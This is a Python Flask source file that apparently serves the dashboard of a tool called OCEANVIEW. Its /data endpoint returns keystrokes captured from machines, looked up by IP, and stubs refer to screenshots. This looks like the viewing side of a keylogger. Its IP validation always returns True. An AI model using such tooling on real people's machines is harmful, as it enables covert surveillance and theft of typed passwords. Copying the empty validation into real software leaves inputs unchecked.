"""
show what's in OCEANVIEW's database.
author: Ethan Witherington.
"""

from flask import Flask, render_template, request, abort, jsonify
import data as databaseobj

# route functions flagged as unused, disabling warning for this function.
# pylint: disable=W0612
def init():
    """ run the frontend app """

    database = databaseobj.Database("db.sqlite", "database/build_db.sql")
    app = Flask(__name__)

    @app.route('/')
    def index():
        """Show my pretty index.html file"""
        return render_template('index.html')

    @app.route('/overview/<string:addr>')
    def machine(addr='192.168.420.69'):
        """Show info about a specific machine"""
        # Firstly, validate the IP.
        if validate_ip(addr):
            return render_template('overview.html', addr=addr)
        return "Invalid IP. You're BAD and you should feel BAD."

    @app.route('/data', methods=['POST'])
    def data():
        """
            Take some JSON, return what it asks for.
            {
                type: "text" or "shot" or "ip"
                since: timestamp # Get all of type since this time. Return all IPs.
                addr: IP address of the machine we want data about.
            }
            return all (type)s that have a timestamp later than (since)
            in the form of an array of strings.
            Strings are plaintext for text and IPs, and filenames for shots.
            If there are a lot, only return 100.
        """
        #Make sure it's JSON
        if not request.is_json:
            print("data request was not JSON.")
            abort(400)
        json = request.get_json()
        if not 'type' in json:
            print("data request did not include a type")
            abort(400)
        if not 'since' in json:
            print("data request did not include a since")
            abort(400)
        if not 'addr' in json:
            print("data request did not include an ip address.")
            abort(400)
        if json['type'] == 'text':
            return jsonify(get_text(json['since'], json['addr'], database))
        """if json['type'] == 'shot':
            return jsonify(get_shots(json['since']))
        if json['type'] == 'ip':
            return jsonify(get_ips())"""
        abort(400)
        return None # God Fucking Damn You PEP8

    @app.route('/brewcoffee')
    def make_coffee():
        """Return code 418, as this is a teapot."""
        return "<h1>418</h1>", 418

    return app

def validate_ip(_addr):
    """Tell if an IP is a valid IP."""
    return True

def get_text(_since, addr, database):
    """Get text later than since from the db"""
    raw = database.get_keystrokes(addr)
    parsed = []
    for entry in raw:
        parsed.append(entry[1])
    return parsed

def get_shots(_since):
    """Get screenshots later than since"""
    return None

def get_ips():
    """Return all IP addresses in the DB"""
    return None
